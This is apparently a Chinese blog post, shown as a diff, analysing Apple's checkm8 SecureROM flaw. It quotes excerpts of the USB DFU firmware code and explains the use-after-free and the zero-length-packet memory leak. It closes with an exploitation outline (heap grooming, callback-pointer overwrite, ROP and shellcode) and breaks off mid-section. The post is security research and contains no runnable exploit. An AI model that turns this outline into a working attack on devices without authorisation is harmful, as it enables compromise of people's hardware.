+<h1 id="漏洞分析">漏洞分析</h1>
+
+<p>checkm8是位于SecureROM中USB DFU协议栈的两个漏洞：</p>
+
+<ul>
+  <li>主攻——UAF（直到A14芯片才修复）</li>
+  <li>辅助——内存泄漏（A12芯片中修复）</li>
+</ul>
+
+<h2 id="usb子系统初始化">USB子系统初始化</h2>
+
+<p>USB数据的处理由两部分组成，第一部分是USB中断处理例程，第二部分是USB任务。</p>
+
+<p>从系统初始化角度来看，USB子系统的初始化最终完成2件事情，一是创建synopsys_otg_task任务响应setup数据包，二是注册synopsys_otg_int_handler中断处理例程。</p>
+
+<p>每当发生USB中断，中断处理函数就把数据从DMA内存区域拷贝到EP0端点的USB任务队列，再通知synopsys_otg_task响应数据包。</p>
+
+<p>usb_init函数完成USB子系统的初始化，调用路径为：
+<em>main → boot_selected → getDFUImage → usb_init</em></p>
+
+<p>usb_init函数完成了4件事：</p>
+
+<ol>
+  <li>创建synopsys_otg_task任务</li>
+</ol>
+
+<p>配合USB中断处理函数，相当于中断的下半部。</p>
+
+<ol>
+  <li>在堆上面分配0x800大小的io_buffer</li>
+</ol>
+
+<p>暂存接收到的启动镜像。</p>
+
+<ol>
+  <li>注册DFU处理函数handler_interface_request</li>
+</ol>
+
+<p>实现了DFU协议栈。</p>
+
+<ol>
+  <li>注册USB中断处理函数synopsys_otg_int_handler
+    <ol>
+      <li>处理SETUP token 或者 OUT token</li>
+    </ol>
+
+    <p>从DMA拷贝数据到全局数组ep0_rx_buffer[0x40]，通知synopsys_otg_task任务解析。从接收缓冲区的大小可知，DFU数据包分段长度为0x40字节；</p>
+
+    <p>b.  处理IN token</p>
+
+    <p>继续DEVICE to HOST传输任务，设备向主机发送的数据包分段长度为0x40。</p>
+  </li>
+</ol>
+
+<h2 id="dfu生命周期">DFU生命周期</h2>
+
+<p>iPhone设备进入DFU模式后，_main函数进入while(1)循环，循环主体是boot_selected函数。</p>
+
+<p>boot_selected函数调用getDFUImage函数试图从主机端接收启动镜像。</p>
+
+<p>getDFUImage函数做了2件事情：</p>
+
+<ol>
+  <li>调用usb_init初始化USB子系统</li>
+  <li>睡眠等待dfu_event事件
+    <ol>
+      <li>在此期间中断处理函数synopsys_otg_int_handler和synopsys_otg_task任务接收DFU镜像</li>
+      <li>若DFU镜像接收完毕，或主机发送RESET命令，则dfu_done被置1，进入USB资源释放流程</li>
+    </ol>
+  </li>
+</ol>
+
+<p>返回boot_selected对接收到的DFU镜像验签，若验证失败则重入getDFUImage，重新初始化USB子系统，重新接收DFU镜像。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-DFU%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.jpg" alt="checkm8-DFU生命周期.jpg" /></p>
+
+<h2 id="dfu镜像接收过程">DFU镜像接收过程</h2>
+
+<p>synopsys_otg_task一直在usb_task_event事件上等待，直到被中断处理例程synopsys_otg_int_handler唤醒，进入handle_interrupt处理USB报文。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_19.53.51.png" alt="截屏2025-03-12 19.53.51.png" /></p>
+
+<p>handle_ep0_data_phase函数接收DFU镜像，调用路径为：</p>
+
+<p>synopsys_otg_task → handle_interrupt → synopsys_otg_handle_ep0_out → usb_core_handle_usb_control_receive → handle_ep0_data_phase</p>
+
+<p>DFU镜像接收过程为：</p>
+
+<ol>
+  <li>镜像包在主机端被分段为0x800大小发送；</li>
+  <li>USB协议栈将0x800的数据分段为0x40大小传输；</li>
+  <li>设备把接收到0x40个字节保存在io_buffer；</li>
+  <li>若io_buffer的0x800空间被填满，把io_buffer内容拷贝到INSECURE_MEMORY区域；</li>
+  <li>重复步骤1～4，直到DFU镜像接收完毕。</li>
+</ol>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E9%95%9C%E5%83%8F%E6%8E%A5%E6%94%B6%E8%BF%87%E7%A8%8B.jpg" alt="checkm8-镜像接收过程.jpg" /></p>
+
+<p>全局变量ep0_data_phase_buffer指示写入的位置，最初指向io_buffer缓冲区。DFU镜像片段被拷贝到io_buffer，更新ep0_data_phase_buffer指向下一个写入位置。</p>
+
+<p>每收到一个DFU镜像片段就更新ep0_data_phase_rcvd，记录已接收的长度。</p>
+
+<p>全局变量ep0_data_phase_length保存了本轮DFU镜像长度，若接收的数据达到预期长度，或最后一次接收的长度小于0x40，说明接收完毕，data_received把DFU镜像片段从io_buffer拷贝到0x1800B0000，该区域也叫INSECURE_MEMORY区域。</p>
+
+<p>再调用usb_core_send_zlp向主机发送一个0长度数据包，表示可以传输下一个0x800片段。</p>
+
+<p>最后清理全局变量，准备接收下一个0x800片段。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">handle_ep0_data_phase</span><span class="p">(</span><span class="n">u_int8_t</span> <span class="o">*</span><span class="n">rx_buffer</span><span class="p">,</span> <span class="n">u_int32_t</span> <span class="n">data_rcvd</span><span class="p">,</span> <span class="n">bool</span> <span class="o">*</span><span class="n">data_phase</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">remaining</span> <span class="o">=</span> <span class="n">ep0_data_phase_length</span> <span class="o">-</span> <span class="n">ep0_data_phase_rcvd</span><span class="p">;</span>
+  <span class="n">to_copy</span> <span class="o">=</span> <span class="p">(</span><span class="n">data_rcvd</span> <span class="o">&gt;</span> <span class="n">remaining</span><span class="p">)</span> <span class="o">?</span> <span class="n">remaining</span> <span class="o">:</span> <span class="n">data_rcvd</span><span class="p">;</span>
+    
+  <span class="n">memcpy</span><span class="p">(</span><span class="n">ep0_data_phase_buffer</span><span class="p">,</span> <span class="n">rx_buffer</span><span class="p">,</span> <span class="n">to_copy</span><span class="p">);</span>
+    
+	<span class="n">ep0_data_phase_buffer</span> <span class="o">+=</span> <span class="n">to_copy</span><span class="p">;</span>
+	<span class="n">ep0_data_phase_rcvd</span> <span class="o">+=</span> <span class="n">to_copy</span><span class="p">;</span>
+
+	<span class="k">if</span><span class="p">((</span><span class="n">ep0_data_phase_rcvd</span> <span class="o">==</span> <span class="n">ep0_data_phase_length</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">data_rcvd</span> <span class="o">!=</span> <span class="n">EP0_MAX_PACKET_SIZE</span><span class="p">))</span>
+	<span class="p">{</span>
+		<span class="n">data_received</span><span class="p">(</span><span class="n">ep0_data_phase_rcvd</span><span class="p">);</span>
+		<span class="n">usb_core_send_zlp</span><span class="p">();</span> <span class="c1">//we should check returnval of call and possibly stall</span>
+		<span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
+	<span class="p">}</span>
+	
+	<span class="k">return</span><span class="p">;</span>
+	
+<span class="nl">done:</span>
+    <span class="n">ep0_data_phase_rcvd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ep0_data_phase_length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ep0_data_phase_buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">ep0_data_phase_if_num</span> <span class="o">=</span> <span class="n">NO_DATA_PHASE_HANDLER</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>全局变量ep0_data_phase_buffer和ep0_data_phase_length由函数handle_interface_request赋值，该函数实现了USB DFU协议栈，具体过程如下：</p>
+
+<ol>
+  <li>在正式传输DFU镜像之前，主机需要发送bmRequest=0x21，bRequest=DFU_DNLOAD的SETUP package；</li>
+</ol>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-23_16.27.37.png" alt="截屏2025-03-23 16.27.37.png" /></p>
+
+<ol>
+  <li>全局变量ep0_data_phase_buffer作为引用传递给handle_interface_request函数作为参数；</li>
+</ol>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">usb_core_handle_usb_control_receive</span> <span class="p">(</span><span class="n">u_int8_t</span> <span class="o">*</span><span class="n">ep0_rx_buffer</span><span class="p">,</span> 
+												<span class="n">bool</span> <span class="n">is_setup</span><span class="p">,</span> <span class="kt">int</span> <span class="n">receive_length</span><span class="p">,</span> <span class="n">bool</span> <span class="o">*</span><span class="n">data_phase</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">setup_request</span><span class="p">,</span> <span class="n">ep0_rx_buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">setup_request</span><span class="p">));</span>	
+	
+	<span class="k">switch</span><span class="p">(</span><span class="n">setup_request</span><span class="p">.</span><span class="n">bmRequestType</span> <span class="o">&amp;</span> <span class="n">USB_REQ_TYPE_MASK</span><span class="p">)</span> <span class="p">{</span>	<span class="c1">//处理setup报文</span>
+		<span class="k">case</span> <span class="n">USB_REQ_TYPE_CLASS</span> <span class="p">:</span>
+			<span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">handle_interface_request</span><span class="p">(</span><span class="o">&amp;</span><span class="n">setup_request</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ep0_data_phase_buffer</span><span class="p">);</span>
+			<span class="n">ep0_data_phase_length</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
+			<span class="k">goto</span> <span class="n">success</span><span class="p">;</span>
+                                                                             
+</code></pre></div></div>
+
+<ol>
+  <li>handle_interface_request函数中把io_buffer指针保存在全局变量ep0_data_phase_buffer中，把wLength字段作为返回值赋值给全局变量ep0_data_phase_length。</li>
+</ol>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">handle_interface_request</span><span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_request</span> <span class="o">*</span><span class="n">request</span><span class="p">,</span>
+																		 <span class="kt">uint8_t</span> <span class="o">**</span><span class="n">out_buffer</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">u_int8_t</span> <span class="n">bRequest</span> <span class="o">=</span> <span class="n">request</span><span class="o">-&gt;</span><span class="n">bRequest</span><span class="p">;</span>
+	<span class="n">u_int16_t</span> <span class="n">wLength</span> <span class="o">=</span> <span class="n">request</span><span class="o">-&gt;</span><span class="n">wLength</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    
+	<span class="k">if</span><span class="p">((</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">bmRequestType</span> <span class="o">&amp;</span> <span class="n">USB_REQ_DIRECTION_MASK</span><span class="p">)</span> <span class="o">==</span> <span class="n">USB_REQ_HOST2DEVICE</span><span class="p">)</span>
+	<span class="p">{</span>    
+		<span class="k">switch</span><span class="p">(</span><span class="n">bRequest</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="k">case</span> <span class="n">DFU_DNLOAD</span><span class="p">:</span>
+			<span class="p">{</span>
+				<span class="k">if</span><span class="p">(</span><span class="n">wLength</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+					<span class="p">.....</span>
+				<span class="p">}</span>
+				<span class="k">else</span> <span class="p">{</span>
+					<span class="k">if</span><span class="p">(</span><span class="n">wLength</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">io_buffer</span><span class="p">))</span> <span class="p">{</span> <span class="c1">//wLength &lt;= 0x800</span>
+						<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+					<span class="p">}</span>		
+					<span class="o">*</span><span class="n">out_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">io_buffer</span><span class="p">;</span>
+				<span class="p">}</span>
+				<span class="n">expecting</span> <span class="o">=</span> <span class="n">wLength</span><span class="p">;</span>
+				<span class="n">ret</span> <span class="o">=</span> <span class="n">wLength</span><span class="p">;</span>
+				<span class="k">break</span><span class="p">;</span>
+			<span class="p">}</span>
+</code></pre></div></div>
+
+<p>io_buffer填满后调用data_received把数据拷贝到全局变量image_buffer指向的INSECURE_MEMORY区域。</p>
+
+<p>其中全局变量image_buffer_size记录了DFU镜像的长度，该值只是定义DFU镜像的最大长度不得超过INSECURE_MEMORY区域的大小，并不是DFU镜像的真实长度。</p>
+
+<p>全局变量total_received记录了INSECURE_MEMORY区域的写入位置。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">data_received</span><span class="p">(</span><span class="n">u_int32_t</span> <span class="n">received</span><span class="p">)</span>
+<span class="p">{</span>
+
+	<span class="k">if</span><span class="p">((</span><span class="n">total_received</span> <span class="o">+</span> <span class="n">received</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">image_buffer_size</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">set_status</span><span class="p">(</span><span class="n">errADDRESS</span><span class="p">,</span> <span class="n">STANDARD_DELAY_MS</span><span class="p">,</span> <span class="n">dfuERROR</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="p">}</span>
+	<span class="k">else</span> <span class="p">{</span>
+		<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">image_buffer</span><span class="p">[</span><span class="n">total_received</span><span class="p">],</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">io_buffer</span><span class="p">,</span> <span class="n">received</span><span class="p">);</span>
+		<span class="n">total_received</span> <span class="o">+=</span> <span class="n">received</span><span class="p">;</span>
+		<span class="n">set_status</span><span class="p">(</span><span class="n">errOK</span><span class="p">,</span> <span class="n">STANDARD_DELAY_MS</span><span class="p">,</span> <span class="n">dfuDNLOAD_IDLE</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="usb资源析构">USB资源析构</h2>
+
+<p>若DFU镜像接收完毕或者USB被reset，getDFUImage调用usb_quiesce函数释放USB资源。</p>
+
+<p>usb_init中分配的0x800大小用于接收DFU镜像的io_buffer也在这里被释放。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-USB%E8%B5%84%E6%BA%90%E6%9E%90%E6%9E%84.jpg" alt="checkm8-USB资源析构.jpg" /></p>
+
+<h2 id="uaf-漏洞函数">UAF 漏洞函数</h2>
+
+<p>若设备在接收DFU镜像过程中主机取消了传输，将导致done标签之后的全局变量继续保留。</p>
+
+<p>ep0_data_phase_buffer指针是当前在io_buffer的写入位置，</p>
+
+<p>ep0_data_phase_rcvd是接收到的字节数，</p>
+
+<p>ep0_data_phase_length是本轮DFU分段长度，由setup报文的wLength字段确定，不超过0x800。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">handle_ep0_data_phase</span> <span class="p">(</span><span class="n">u_int8_t</span> <span class="o">*</span><span class="n">rx_buffer</span><span class="p">,</span> <span class="n">u_int32_t</span> <span class="n">data_rcvd</span><span class="p">,</span> 
+																				<span class="n">bool</span> <span class="o">*</span><span class="n">data_phase</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="p">......</span>
+    
+	<span class="k">if</span><span class="p">((</span><span class="n">ep0_data_phase_rcvd</span> <span class="o">==</span> <span class="n">ep0_data_phase_length</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">data_rcvd</span> <span class="o">!=</span> <span class="n">EP0_MAX_PACKET_SIZE</span><span class="p">))</span>
+	<span class="p">{</span>    
+	  <span class="n">data_received</span><span class="p">(</span><span class="n">ep0_data_phase_rcvd</span><span class="p">);</span>
+		<span class="n">usb_core_send_zlp</span><span class="p">();</span> <span class="c1">//we should check returnval of call and possibly stall</span>
+  <span class="p">}</span>  
+		<span class="k">goto</span> <span class="n">done</span><span class="p">;</span>   
+	<span class="p">}</span>
+	
+	<span class="k">return</span><span class="p">;</span>
+	
+<span class="n">done</span><span class="o">:</span>
+    <span class="n">ep0_data_phase_rcvd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ep0_data_phase_length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ep0_data_phase_buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">ep0_data_phase_if_num</span> <span class="o">=</span> <span class="n">NO_DATA_PHASE_HANDLER</span><span class="p">;</span>
+    <span class="o">*</span><span class="n">data_phase</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+<span class="err">}</span>
+</code></pre></div></div>
+
+<p>若主机再向设备发送bmRequestType=0x21，bRequest=DFU_CLR_STATUS的setup报文，则dfu_done被置位，产生一个dfu_event事件。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">handle_interface_request</span><span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_request</span> <span class="o">*</span><span class="n">request</span><span class="p">,</span> 
+																		<span class="kt">uint8_t</span> <span class="o">**</span><span class="n">out_buffer</span><span class="p">){</span>
+	<span class="k">if</span><span class="p">((</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">bmRequestType</span> <span class="o">&amp;</span> <span class="n">USB_REQ_DIRECTION_MASK</span><span class="p">)</span> <span class="o">==</span> <span class="n">USB_REQ_HOST2DEVICE</span><span class="p">){</span>
+		<span class="k">switch</span><span class="p">(</span><span class="n">bRequest</span><span class="p">){</span>
+			<span class="k">case</span> <span class="n">DFU_CLR_STATUS</span> <span class="p">:</span>
+			<span class="k">case</span> <span class="n">DFU_ABORT</span><span class="p">:</span>
+			<span class="p">{</span>
+				<span class="p">......</span>
+				<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">dfu_done</span><span class="p">)</span> <span class="p">{</span>
+					<span class="n">completion_status</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+					<span class="n">dfu_done</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>             <span class="c1">//dfu_done置位</span>
+					<span class="n">event_signal</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dfu_event</span><span class="p">);</span>    <span class="c1">//产生dfu_event事件</span>
+				<span class="p">}</span>
+				<span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+				<span class="k">break</span><span class="p">;</span>
+			<span class="p">}</span>
+		<span class="p">......</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>在dfu_event事件上睡眠等待的getDFUImage被唤醒，调用usb_quiesce释放USB资源。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kt">int</span> <span class="nf">getDFUImage</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">maxlen</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="p">......</span>
+	
+	<span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">dfu_done</span><span class="p">)</span> 
+		<span class="n">event_wait</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dfu_event</span><span class="p">);</span>
+    
+	<span class="n">usb_quiesce</span><span class="p">();</span>      <span class="c1">//释放USB资源，包括io_buffer</span>
+    
+	<span class="p">......</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>boot_selected函数中镜像校验失败，重入getDFUImage函数，重新分配USB资源，重新接收DFU镜像。</p>
+
+<p>但是指示写入位置的ep0_data_phase_buffer还是沿用的上一轮getDFUImage留下的。</p>
+
+<p>若本轮io_buffer分配的位置和前一轮一样，那么这并不会造成什么破坏。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E6%B2%A1%E6%9C%89%E9%A9%BB%E7%95%99%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E9%87%8D%E6%96%B0%E5%88%86%E9%85%8D.jpg" alt="checkm8-没有驻留情况下的重新分配.jpg" /></p>
+
+<h2 id="内存泄漏bug">内存泄漏BUG</h2>
+
+<p>若getDFUImage释放USB资源时，发生了内存泄漏，部分对象得不到释放，第二轮getDFUImage将会得到不同的堆布局，此时通过ep0_data_phase_buffer指针写入数据就会导致堆溢出。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E9%A9%BB%E7%95%99%E4%B8%8B%E7%9A%84%E9%87%8D%E6%96%B0%E5%88%86%E9%85%8D.jpg" alt="checkm8-驻留下的重新分配.jpg" /></p>
+
+<p>内存泄漏的对象是usb_device_io_request。</p>
+
+<p>该对象的作用是，若数据传输方向是设备到主机，那么会申请一个usb_device_io_request对象，挂载到ep-&gt;io_head链表上，ep是USB传输端点，是USB设备的最小功能单元，链表出入顺序是FIFO。</p>
+
+<p>其中io_buffer指针指向数据传输缓冲区，例如USB设备描述符，</p>
+
+<p>io_length表示传输的数据量，</p>
+
+<p>callback是回调函数，在usb_device_io_request销毁之前调用，指向standard_device_request_cb函数，</p>
+
+<p>next是链表指针，指向下一个usb_device_io_request对象，通过next指针形成单向链表。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">usb_device_io_request</span><span class="p">{</span>
+		<span class="n">u_int32_t</span>                       <span class="n">endpoint</span><span class="p">;</span>
+		<span class="k">volatile</span> <span class="n">u_int8_t</span>               <span class="o">*</span><span class="n">io_buffer</span><span class="p">;</span>
+		<span class="kt">int</span>                             <span class="n">status</span><span class="p">;</span>
+		<span class="n">u_int32_t</span>                       <span class="n">io_length</span><span class="p">;</span>
+		<span class="n">u_int32_t</span>                       <span class="n">return_count</span><span class="p">;</span>
+		<span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">callback</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">io_request</span><span class="p">);</span>
+		<span class="k">struct</span> <span class="n">usb_device_io_request</span>    <span class="o">*</span><span class="n">next</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>当设备接收到bmRequest=0x21，bRequest=0x4（DFU_CLR_STATUS）的SETUP package，那么会触发usb_quiesce释放USB资源，该过程会释放ep→io_buffer队列，每个对象依次调用callback回调函数。在此过程中会发生usb_device_io_request对象的内存泄漏。</p>
+
+<p>释放释放ep→io_buffer队列的路径为：</p>
+
+<p>usb_quiesce → usb_core_stop → usb_controller_stop → synopsys_otg_stop → usb_core_deactivate_endpoint → usb_controller_abort_endpoint → synopsys_otg_abort_endpoint</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">synopsys_otg_abort_endpoint</span><span class="p">(</span><span class="n">u_int32_t</span> <span class="n">endpoint</span><span class="p">){</span>
+	<span class="p">......</span>
+	<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span><span class="p">;</span>         <span class="c1">//摘下端点的IO队列</span>
+	<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="p">......</span>
+	<span class="k">while</span><span class="p">(</span><span class="n">aborted_list</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">aborted_req</span> <span class="o">=</span> <span class="n">aborted_list</span><span class="p">;</span>
+		<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+		<span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="n">USB_IO_ABORTED</span><span class="p">;</span>
+		<span class="n">usb_core_complete_endpoint_io</span><span class="p">(</span><span class="n">aborted_req</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>io_length取主机请求的数据长度和设备实际需要传输的数据长度两者之间的较小值。例如主机请求192字节的设备描述符，而设备描述符实际长度为198字节，那么io_length=192。</p>
+
+<p>若当前usb_device_io_request对象传输的数据长度io_length是0x40的倍数，且SETUP package请求的数据量大于io_length，那么设备向主机发送一个零长度数据包（zero length package）表示数据传输完毕。</p>
+
+<p>DFU协议栈这么做的理由是，若主机接收到的数据包长度小于0x40，则表示这是最后一个数据包。若主机请求的数据量大于设备需要传输的实际的数据量，这种情况下设备当然就是有多少数据就传多少数据，如果设备实际传输的数据量是0x40的倍数，那么主机便无法判断最后一个数据包。所以就需要设备主动发送一个zlp表示数据传输完毕。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">usb_core_complete_endpoint_io</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">io_req</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
+	<span class="p">}</span>  
+	<span class="n">free</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
+	<span class="n">io_req</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">standard_device_request_cb</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">req</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">if</span><span class="p">((</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span> <span class="o">%</span> <span class="mh">0x40</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> 
+					<span class="p">(</span><span class="n">setup_request</span><span class="p">.</span><span class="n">wLength</span> <span class="o">&gt;</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span><span class="p">))</span> <span class="p">{</span>
+		<span class="n">usb_core_send_zlp</span><span class="p">();</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>需要为zlp再申请一个usb_device_io_request对象，再通过usb_controller_do_endpoint_io函数挂载到ep→io_head链表上。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">usb_core_send_zlp</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+	<span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">io_request</span> <span class="o">=</span> 
+													<span class="n">alloc_ep0_device_io_request</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+	<span class="p">......</span>
+	<span class="n">usb_controller_do_endpoint_io</span><span class="p">(</span><span class="n">io_request</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>再回到synopsys_otg_abort_endpoint函数，此时的ep-&gt;io_head链表实际上不会再有任何地方引用，ep-&gt;io_head也将随着ep对象的释放而失效，那么刚刚加进去的zlp对象也就失去了引用，没有任何地方能释放zlp，造成了内存泄漏。</p>
+
+<p>所以总结一下checkm8漏洞能够成立的2个要点：</p>
+
+<ul>
+  <li>仅仅有UAF还不能造成内存破坏</li>
+  <li>配合内存泄漏可以覆盖相邻对象</li>
+</ul>
+
+<h2 id="利用思路">利用思路</h2>
+
+<p>构造如下堆布局，在fs conf对象后面分配usb_device_io_request对象。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%AC%AC_20_%E9%A1%B5.jpg" alt="checkm8-第 20 页.jpg" /></p>
+
+<p>堆溢出覆盖usb_device_io_request对象的callback指针和next指针，释放usb_device_io_request对象时就会调用callback函数指针，且参数是对象本身。</p>
+
+<p>释放usb_device_io_request对象时，沿着next指针遍历，可以引导到攻击者构造的区域，实现更多的rop功能。</p>
+
+<p>利用思路概括起来就是：</p>
+
+<ol>
+  <li>利用内存泄漏进行堆风水，为UAF覆盖函数指针创造条件</li>
+  <li>UAF覆盖callback函数指针</li>
+  <li>写入shellcode和ROP链</li>
+  <li>释放对象触发函数指针调用，劫持程序流到ROP和shellcode</li>
+</ol>
+
+<h2 id="堆块控制能力">堆块控制能力</h2>
+
+<ol>
+  <li><strong>分配和释放usb_device_io_request对象的时机可控</strong></li>
+</ol>
+
+<p>堆风水的重要前提是攻击者能够控制堆块的分配和释放，无论这种控制是直接的还是间接的。</p>
+
+<ul>
+  <li>堆块的分配</li>
+</ul>
+
+<p>攻击者只需要向设备发送一个device to host类型的SETUP package向设备请求数据，就能在堆上分配一个usb_device_io_request对象。</p>
+
+<ul>
+  <li>堆块的释放</li>
